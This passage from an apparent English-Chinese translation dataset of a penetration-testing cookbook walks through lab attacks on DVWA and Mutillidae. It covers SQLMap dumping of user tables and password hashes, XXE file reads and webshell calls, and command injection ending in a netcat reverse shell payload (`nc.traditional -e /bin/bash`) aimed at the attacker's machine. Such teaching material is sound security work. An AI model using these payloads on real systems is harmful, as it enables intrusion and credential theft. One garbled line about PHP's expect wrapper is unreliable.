  zh: 一旦 SQLMap 检测到应用程序使用的 DBMS，它还会询问我们是否要跳过对其他 DBMS 的测试，是否要包括所有针对已检测系统的测试，即使这些测试超出了当前配置的级别和风险范围。在这种情况下，我们回答`Yes`跳过其他系统，并回答`No`包含所有测试。
- en: 'Once the parameter we specified is found to be vulnerable, SQLMap will ask
    us whether we want to test other parameters. We answer `No` to this question,
    and then we will see the result:'
  id: totrans-201
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦我们指定的参数被发现存在漏洞，SQLMap 会询问我们是否要测试其他参数。我们对这个问题回答`No`，然后我们将看到结果：
- en: '![](assets/45b3cdef-1210-4066-bd50-19218672da61.png)'
  id: totrans-202
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/45b3cdef-1210-4066-bd50-19218672da61.png)'
- en: 'If we want to obtain the usernames and passwords, like we did in the previous
    recipe, we need to know the name of the table that has such information. Execute
    the following command in the Terminal:'
  id: totrans-203
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果我们想获取用户名和密码，像前面那样做，我们需要知道包含这些信息的表名。在终端中执行以下命令：
- en: '[PRE10]'
  id: totrans-204
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'SQLMap saves a log of the injections it performs, so this second attack will
    take less time than the first one. As you can see, the attack returns the list
    of tables in the database we specified:'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: SQLMap 会保存它执行的注入日志，因此第二次攻击比第一次所需的时间要少。正如你所见，攻击返回了我们指定的数据库中的表列表：
- en: '![](assets/6fee352d-7231-4dab-84e2-5100c35c8c14.png)'
  id: totrans-206
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/6fee352d-7231-4dab-84e2-5100c35c8c14.png)'
- en: 'Table accounts is the one that looks like having the information we want. Let''s
    dump its content:'
  id: totrans-207
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 表格 accounts 看起来包含我们需要的信息。让我们导出它的内容：
- en: '[PRE11]'
  id: totrans-208
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'We now have the full users'' table, and we can see in this case that passwords
    aren''t encrypted, so we can use them as we see them:'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在得到了完整的用户表，可以看到在这种情况下密码没有加密，因此我们可以直接使用它们：
- en: '![](assets/4d94d71a-f2b3-4807-8628-2142eef2f984.png)'
  id: totrans-210
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/4d94d71a-f2b3-4807-8628-2142eef2f984.png)'
- en: 'SQLMap can also be used to escalate privileges in the database and the operating
    system. For example, if the database user is administrator, as is the case here,
    we can use the `--users` and `--passwords` options to extract names and password
    hashes of all database users, as shown in the following screenshot:'
  id: totrans-211
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: SQLMap 还可以用于提升数据库和操作系统的权限。例如，如果数据库用户是管理员（如这里的情况），我们可以使用`--users`和`--passwords`选项提取所有数据库用户的名称和密码哈希值，如下所示的屏幕截图所示：
- en: '![](assets/1e669776-3799-40b2-8442-bb2176bba0af.png)'
  id: totrans-212
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/1e669776-3799-40b2-8442-bb2176bba0af.png)'
- en: Often, these are also operating system users and will allow us to escalate to
    the operating system or other network hosts.
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，这些也是操作系统用户，允许我们提升权限至操作系统或其他网络主机。
- en: 'We can also get a shell that will allow us to send SQL queries to the database
    directly, as shown here:'
  id: totrans-214
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们还可以得到一个外壳，使我们能够直接向数据库发送 SQL 查询，如下所示：
- en: '![](assets/7e15e477-a960-496f-a544-4a2a783942ca.png)'
  id: totrans-215
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/7e15e477-a960-496f-a544-4a2a783942ca.png)'
- en: How it works...
  id: totrans-216
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: SQLMap fuzzes all inputs in the given URL and data, or only the specified one
    in the `-p `option, with SQLi strings and interprets the response to discover
    whether or not there is a vulnerability. It's good practice not to fuzz all inputs;
    it's better to use SQLMap to exploit an injection that we already know exists
    and always try to narrow the search process providing all information available
    to us, such as vulnerable parameters, DBMS type, and others; looking for an injection
    with all the possibilities open could take a lot of time and generate very suspicious
    traffic in the network.
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: SQLMap 会对给定 URL 和数据中的所有输入进行模糊测试，或者仅对 `-p` 选项中指定的输入进行模糊测试，使用 SQLi 字符串并解析响应来发现是否存在漏洞。最好不要对所有输入进行模糊测试；更好的做法是使用
    SQLMap 利用我们已经知道存在的注入漏洞，并尽量通过提供所有可用信息（如脆弱参数、数据库管理系统类型等）来缩小搜索范围；打开所有可能性去寻找注入漏洞可能会花费大量时间，并且在网络中产生非常可疑的流量。
- en: 'In this recipe, we already knew that the username parameter was vulnerable
    to SQLi (since we used the SQLi test page from `mutillidae`). In the first attack,
    we only wanted to be sure that there was an injection there and asked for some
    very basic information: user name (`--curent-user`), database name (`--current-db`),
    and whether the user is an administrator (`--is-dba`).'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们已经知道用户名参数对 SQLi 漏洞是脆弱的（因为我们使用了 `mutillidae` 中的 SQLi 测试页面）。在第一次攻击中，我们只想确认这里是否存在注入漏洞，并请求一些非常基本的信息：用户名（`--curent-user`）、数据库名（`--current-db`）以及用户是否是管理员（`--is-dba`）。
- en: In the second attack, we specified the database we wanted to query with the
    `-D` option and the name obtained from the previous attack, and asked for the
    list of tables it contains with `--tables`. Knowing what table we wanted to get
    (`-T accounts`), we told SQLMap to dump its content with `--dump`.
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 在第二次攻击中，我们通过 `-D` 选项指定了我们希望查询的数据库以及从先前攻击中获得的名称，并通过 `--tables` 请求列出它包含的所有表。知道了我们想获取的表（`-T
    accounts`），我们告诉 SQLMap 使用 `--dump` 转储其内容。
- en: As the user querying the database from the application is DBA, it allows us
    to ask the database for other users' information, and SQLMap makes our lives much
    easier with the `--users` and `--passwords` options. These options ask for usernames
    and passwords, as all DBMSes store their users' passwords encrypted, and what
    we obtained were hashes, so we still have to use a password cracker to crack them.
    If you said `Yes` when SQLMap asked to perform a dictionary attack, you may now
    know the password of some users.
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 由于查询数据库的用户是 DBA，这允许我们请求数据库中其他用户的信息，SQLMap 通过 `--users` 和 `--passwords` 选项让我们的工作变得更加轻松。这些选项请求用户名和密码，因为所有的数据库管理系统都以加密方式存储用户的密码，而我们得到的只是哈希值，所以我们仍然需要使用密码破解工具来破解它们。如果你在
    SQLMap 提示进行字典攻击时选择了 “Yes”，你现在可能已经知道某些用户的密码了。
- en: We also used the `--sql-shell` option to obtain a shell from which we could
    send SQL queries to the database. That was not a real shell, of course, just SQLMap
    sending the commands we wrote through SQLi and returning the results of those
    queries.
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还使用了 `--sql-shell` 选项来获取一个可以用来发送 SQL 查询到数据库的 shell。当然，这不是一个真正的 shell，只是 SQLMap
    通过 SQLi 发送我们写的命令并返回查询结果。
- en: There's more...
  id: totrans-222
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多…
- en: SQLMap can also inject input variables in `POST` requests. To do that, we only
    need to add the `--data` option, followed by the `POST` data inside quotes, for
    example: `--data “username=test&password=test”`.
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: SQLMap 还可以在 `POST` 请求中注入输入变量。为此，我们只需要添加 `--data` 选项，后面跟上引号中的 `POST` 数据，例如：`--data
    “username=test&password=test”`。
- en: Sometimes, we need to be authenticated in an application in order to have access
    to the vulnerable URL of an application. If this happens, we can pass a valid
    session's cookie to SQLMap using the `--cookie` option: `--cookie “PHPSESSID=ckleiuvrv60fs012hlj72eeh37”`. This
    is also useful for testing for injections in cookie values.
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 有时，为了访问应用程序中的敏感 URL，我们需要在应用程序中进行身份验证。如果发生这种情况，我们可以通过 `--cookie` 选项将有效会话的 cookie
    传递给 SQLMap：`--cookie “PHPSESSID=ckleiuvrv60fs012hlj72eeh37”`。这对于测试 cookie 值中的注入也非常有用。
- en: Another interesting feature of this tool is that, besides the fact that it can
    bring us an SQL shell where we can issue SQL queries, more interestingly, we could
    gain command execution in the database server using `--os-shell` (this is especially
    useful when injecting Microsoft SQL Server). To see all the options and features
    that SQLMap has, you can run `sqlmap --help`.
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 这个工具的另一个有趣功能是，除了它可以为我们提供一个 SQL shell，让我们可以发出 SQL 查询外，更有趣的是，我们还可以通过 `--os-shell`
    获得数据库服务器上的命令执行权限（当注入 Microsoft SQL Server 时特别有用）。要查看 SQLMap 所有的选项和功能，可以运行 `sqlmap
    --help`。
- en: See also
  id: totrans-226
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 另见
- en: 'Kali Linux includes other tools that are capable of detecting and exploiting
    SQLi vulnerabilities that may be useful to use instead of, or in conjunction with,
    SQLMap:'
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: Kali Linux 包含其他能够检测和利用 SQLi 漏洞的工具，可以在使用 SQLMap 时替代或与之结合使用：
- en: '**sqlninja**: A very popular tool dedicated to MS SQL Server exploitation.'
  id: totrans-228
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**sqlninja**：一款非常流行的工具，专门用于 MS SQL Server 的利用。'
- en: '**Bbqsql**: A blind SQLi framework written in Python.'
  id: totrans-229
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Bbqsql**：一个用 Python 编写的盲 SQLi 框架。'
- en: '**jsql**: A Java-based tool with a fully automated GUI; we just need to introduce
    the URL and click a button.'
  id: totrans-230
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**jsql**：一款基于 Java 的工具，具有完全自动化的 GUI；我们只需输入 URL 并点击一个按钮。'
- en: '**Metasploit**: This includes various SQLi modules for different DBMSes.'
  id: totrans-231
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Metasploit**：包括多个用于不同 DBMS 的 SQLi 模块。'
- en: Exploiting an XML External Entity injection
  id: totrans-232
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用 XML 外部实体注入
- en: XML is a format mainly used to describe the structure of documents or data;
    HTML, for example, is a use of XML.
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: XML 是一种主要用于描述文档或数据结构的格式；例如，HTML 就是 XML 的一种应用。
- en: XML entities are like data structures defined inside an XML structure, and some
    of them have the ability to read files from the system or even execute commands.
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: XML 实体类似于在 XML 结构中定义的数据结构，其中一些实体能够读取系统中的文件，甚至执行命令。
- en: In this recipe, we will exploit an **XML External Entity** (**XEE**) injection
    vulnerability to read files from the server and remotely execute code in it.
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 在本食谱中，我们将利用 **XML 外部实体**（**XEE**）注入漏洞，从服务器读取文件并远程执行代码。
- en: Getting ready
  id: totrans-236
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备就绪
- en: We suggest that you read the *Abusing file inclusions and uploads* recipe before
    doing this.
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 我们建议在进行此操作之前，先阅读 *滥用文件包含和上传* 这篇食谱。
- en: How to do it...
  id: totrans-238
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何实现...
- en: 'Refer to the following steps:'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 请参阅以下步骤：
- en: Browse to `http://192.168.56.11/mutillidae/index.php?page=xml-validator.php`.
  id: totrans-240
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 浏览到 `http://192.168.56.11/mutillidae/index.php?page=xml-validator.php`。
- en: 'It say it is an XML validator. Let''s try to submit the example test and see
    what happens. In the XML box, put `<somexml><message>Hello World</message></somexml>`
    and click Validate XML. It should only display the message `Hello World` in the
    parsed section:'
  id: totrans-241
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 它说它是一个 XML 校验器。我们来试试提交示例测试，看看会发生什么。在 XML 框中输入 `<somexml><message>Hello World</message></somexml>`，然后点击“验证
    XML”。它应该只显示 `Hello World` 消息在解析部分：
- en: '![](assets/06c41430-2d9b-46e7-9f51-ee5d044c13cf.png)'
  id: totrans-242
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/06c41430-2d9b-46e7-9f51-ee5d044c13cf.png)'
- en: 'Now, let''s see whether it processes entities correctly. Enter the following:'
  id: totrans-243
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，让我们来看一下它是否正确处理实体。请输入以下内容：
- en: '[PRE12]'
  id: totrans-244
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: 'Here, we only defined an entity and set the value `Mr Bob` to it. The parser
    interprets the entity and replaces the value when showing the result:'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们仅定义了一个实体，并将值 `Mr Bob` 设置给它。解析器解释实体并在显示结果时替换其值：
- en: '![](assets/8396a7da-bf92-4546-abc9-3baa2639bf22.png)'
  id: totrans-246
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/8396a7da-bf92-4546-abc9-3baa2639bf22.png)'
- en: 'That''s the use of an internal entity. Let''s try an external one:'
  id: totrans-247
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这就是内部实体的使用。让我们试试外部实体：
- en: '[PRE13]'
  id: totrans-248
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'In the result, we can see that the injection returns the contents of a file:'
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 在结果中，我们可以看到注入返回了文件的内容：
- en: '![](assets/5d38613a-c227-4d9c-97ad-22412815484c.png)'
  id: totrans-250
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/5d38613a-c227-4d9c-97ad-22412815484c.png)'
- en: Using this technique, we can extract any file in the system that is readable
    to the user under which the web server runs.
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 使用此技术，我们可以提取系统中任何可由 Web 服务器运行的用户读取的文件。
- en: 'We can also use XEE to load web pages. In *Abusing file inclusions*, we managed
    to upload a webshell to the server. Let''s try to reach it:'
  id: totrans-252
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们还可以使用 XEE 来加载网页。在 *滥用文件包含* 中，我们成功地将 Webshell 上传到服务器。我们来尝试访问它：
- en: '[PRE14]'
  id: totrans-253
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'This results in the page including and executing the server-side code and returning
    the command''s result:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 这样会导致页面包含并执行服务器端代码，并返回命令的结果：
- en: '![](assets/040cb0b8-9aab-4bc6-823d-0fd68c2e638f.png)'
  id: totrans-255
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/040cb0b8-9aab-4bc6-823d-0fd68c2e638f.png)'
- en: How it works...
  id: totrans-256
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: XML gives the possibility of defining entities. An entity in XML is a name with
    a value associated with it. Every time an entity is used in the document, it will
    be replaced by its value when the XML file is processed. Using this and the different
    wrappers available (such as `file://` to load system files, or `http://` to load
    URLs), we can abuse implementations that don't have the proper security measures
    in terms of input validation and XML parser configuration, and extract sensitive
    data or even execute commands in the server.
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: XML 提供了定义实体的可能性。在 XML 中，实体是一个与其关联的值的名称。每当实体在文档中被使用时，在处理 XML 文件时它会被其值替换。利用这一点以及可用的不同包装器（如
    `file://` 加载系统文件，或 `http://` 加载 URL），我们可以滥用那些没有适当安全措施（如输入验证和 XML 解析器配置）的实现，从而提取敏感数据，甚至在服务器上执行命令。
- en: In this recipe, we used the `file://` wrapper to make the parser load an arbitrary
    file from the server, and, after that, with the `http://` wrapper, we called a
    web page that happened to be a `webshell` in the same server and executed system
    commands with it.
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 在本教程中，我们使用了`file://`包装器来让解析器从服务器加载任意文件，之后，通过`http://`包装器调用了一个恰好是同一服务器中的`webshell`的网页，并利用它执行了系统命令。
- en: There's more...
  id: totrans-259
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多...
- en: There is also a **Denial of Service** (**DoS**) attack through this vulnerability
    called **billion laughs**. You can read more about it on wikipedia: [https://en.wikipedia.org/wiki/Billion_laughs](https://en.wikipedia.org/wiki/Billion_laughs).
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 通过此漏洞，还可以进行**拒绝服务**（**DoS**）攻击，这种攻击被称为**十亿次笑声**。你可以在维基百科上了解更多信息：[https://en.wikipedia.org/wiki/Billion_laughs](https://en.wikipedia.org/wiki/Billion_laughs)。
- en: There is a different wrapper (such as `file://` or `http://`) for XML entities
    supported by PHP, which, if enabled in the server, could allow command execution
    without the need to upload a file. It is expect `://`. You can find more information
    on this and other wrappers at [http://www.php.net/manual/en/wrappers.php](http://www.php.net/manual/en/wrappers.php).
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: PHP支持的XML实体也有不同的包装器（如`file://`或`http://`），如果在服务器上启用，可能允许执行命令而无需上传文件。它的格式是`://`。你可以在这里找到更多关于此和其他包装器的信息：[http://www.php.net/manual/en/wrappers.php](http://www.php.net/manual/en/wrappers.php)。
- en: See also
  id: totrans-262
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 另请参见
- en: 'To see an impressive example of how XEE vulnerabilities were found in some
    of the most popular websites in the world, have a look at [http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution](http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution).
    Or, for a more recent example, check out this exploitation of Oracle Peoplesoft:
    [https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce).'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 若想查看一些世界上最受欢迎网站上发现的XEE漏洞的精彩实例，浏览一下[http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution](http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution)。或者，查看一个更新的实例，了解如何利用Oracle
    Peoplesoft： [https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)。
- en: Detecting and exploiting command injection vulnerabilities
  id: totrans-264
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 检测并利用命令注入漏洞
- en: We have seen before how PHP's `system()` can be used to execute operating system
    commands in the server; sometimes, developers use instructions such as that, or
    others with the same functionality, to perform certain tasks. Sometimes, they
    use unvalidated user input as parameters for the execution of commands.
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 我们之前已经看到，PHP的`system()`可以用来在服务器上执行操作系统命令；有时，开发人员使用类似的指令或其他具有相同功能的指令来执行某些任务。有时，他们会使用未经验证的用户输入作为执行命令的参数。
- en: In this recipe, we will exploit a command injection vulnerability and extract
    important information from the server.
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 在本教程中，我们将利用命令注入漏洞并从服务器中提取重要信息。
- en: How to do it...
  id: totrans-267
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'Log into DVWA and go to Command Execution:'
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 登录到DVWA并进入命令执行：
- en: 'We will see a Ping for FREE form. Let''s try it! Ping to `192.168.56.10` (our
    Kali Linux machine''s IP):'
  id: totrans-269
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将看到一个免费的Ping表单。让我们试试吧！Ping `192.168.56.10`（我们Kali Linux机器的IP）：
- en: '![](assets/ba776c6d-d9dd-4d98-8486-43165a1ec8c2.png)'
  id: totrans-270
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/ba776c6d-d9dd-4d98-8486-43165a1ec8c2.png)'
- en: That output looks like it was taken directly from the ping command's output.
    This suggests that the server is using an operating system command to execute
    the ping, so it may be possible to inject operating system commands.
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 该输出看起来像是直接从ping命令的输出中提取的。这表明服务器可能在使用操作系统命令来执行ping，因此可能存在注入操作系统命令的可能性。
- en: 'Let''s try to inject a very simple command. Submit the following code, `192.168.56.10;uname
    -a`:'
  id: totrans-272
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们尝试注入一个非常简单的命令。提交以下代码，`192.168.56.10;uname -a`：
- en: '![](assets/de4aa7a4-4c44-45e8-9382-a645469ba7f1.png)'
  id: totrans-273
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/de4aa7a4-4c44-45e8-9382-a645469ba7f1.png)'
- en: We can see the `uname` command's output just after ping's output. We have a
    command injection vulnerability here.
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到`uname`命令的输出紧跟在ping的输出之后。这里存在一个命令注入漏洞。
- en: 'How about without the IP address: `;uname -a`. The result is shown in the following
    screenshot:'
  id: totrans-275
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果没有IP地址，试试`;uname -a`。结果如下图所示：
- en: '![](assets/544d8ffd-b9dc-4eb7-b22a-37ec3c699546.png)'
  id: totrans-276
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/544d8ffd-b9dc-4eb7-b22a-37ec3c699546.png)'
- en: 'Now, we are going to obtain a reverse shell on the server. First, we must be
    sure the server has everything we need. Submit `;ls /bin/nc*`. It should return
    a list of files with a full path:'
  id: totrans-277
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们将获得服务器上的反向Shell。首先，我们必须确保服务器上有我们需要的所有工具。提交`;ls /bin/nc*`。它应该返回一个带有完整路径的文件列表：
- en: '![](assets/3f7e3524-5ef0-4164-a304-b7c640a480b7.png)'
  id: totrans-278
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/3f7e3524-5ef0-4164-a304-b7c640a480b7.png)'
- en: So, we have more than one version of NetCat, which is the tool we are going
    to use to generate the connection. The OpenBSD version of NetCat does not support
    the execution of commands on connection, so we will use the traditional one.
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，我们有多个版本的 NetCat，这是我们将用来生成连接的工具。OpenBSD 版本的 NetCat 不支持在连接时执行命令，因此我们将使用传统版本。
- en: 'The next step is to listen to a connection in our Kali machine; open a Terminal
    and run the following command:'
  id: totrans-280
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是在我们的 Kali 机器上监听一个连接；打开一个终端并运行以下命令：
- en: '[PRE15]'
  id: totrans-281
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'And, back in the browser, submit the following: `;nc.traditional -e /bin/bash
    192.168.56.10 1691 &`.'
  id: totrans-282
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 然后，在浏览器中提交以下内容：`;nc.traditional -e /bin/bash 192.168.56.10 1691 &`。
- en: 'We will see how a connection is received in the listening Kali Terminal. There,
    we can execute commands on the server, as in the following example:'
  id: totrans-283
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将看到在监听的 Kali 终端中如何接收连接。在那里，我们可以像以下示例一样在服务器上执行命令：
- en: '![](assets/1f02672a-70ee-46c3-a990-1db4e14bd906.png)'
  id: totrans-284
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/1f02672a-70ee-46c3-a990-1db4e14bd906.png)'
- en: Our Terminal will react to the connection. We now can issue non-interactive
    commands and check their output.
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的终端会对连接做出响应。现在，我们可以发出非交互式命令并检查其输出。
- en: How it works...
  id: totrans-286
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: 'As in the case of SQLi and others, command injection vulnerabilities are due
    to a poor input validation mechanism and the use of user-provided data to form
    strings that will later be used as commands to the operating system. If we look
    at the source code of the page we just attacked (there is a button in the bottom
    right-hand corner on every DVWA''s page), it will look just like this:'
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: 与 SQLi 等其他情况一样，命令注入漏洞是由于输入验证机制不当，并且使用用户提供的数据来构建字符串，这些字符串稍后会作为命令传递给操作系统。如果我们查看刚才攻击的页面的源代码（每个
    DVWA 页面右下角都有一个按钮），它将看起来像这样：
- en: '[PRE16]'
  id: totrans-288
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: We can see it directly appends the user's input to the `ping` command. All we
    did was to add a semicolon, which the system's shell interpreted as a command
    separator, and next to it, the command we wanted to execute.
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以直接看到它将用户的输入附加到 `ping` 命令中。我们所做的只是添加了一个分号，系统的 shell 将其解释为命令分隔符，接下来是我们想要执行的命令。
- en: After having a successful command execution, the next step was to verify whether
    the server had NetCat, which is a tool that has the ability to establish network
    connections and, in some versions, to execute a command when a new connection
    is established. We saw that the server's system had two different versions of
    NetCat and executed the one we know supports the feature we require.
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: 在成功执行命令后，下一步是验证服务器是否安装了 NetCat，这是一个能够建立网络连接并且在建立新连接时执行命令的工具。我们发现服务器的系统有两个不同版本的
    NetCat，并执行了我们知道支持所需功能的那个版本。
- en: We then set our attacking system to listen for a connection on TCP port `1691`
    (it could have been any other available TCP port), and after that, we instructed
    the server to connect to our machine through that port and to execute `/bin/bash`
    (a system shell) when the connection establishes. Anything we send through that
    connection will be received as input by the shell in the server. The use of `&`
    at the end of the command is to execute it in the background and prevent the PHP
    script's executions from stopping because it's waiting for a response from the
    command.
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，我们将攻击系统设置为监听 `1691` 端口的连接（它可以是任何其他可用的 TCP 端口），之后，我们指示服务器通过该端口连接到我们的机器，并在连接建立时执行
    `/bin/bash`（一个系统 shell）。通过该连接发送的任何内容都将作为输入被服务器中的 shell 接收。命令末尾的 `&` 用于在后台执行该命令，并防止
    PHP 脚本执行因等待命令响应而中断。
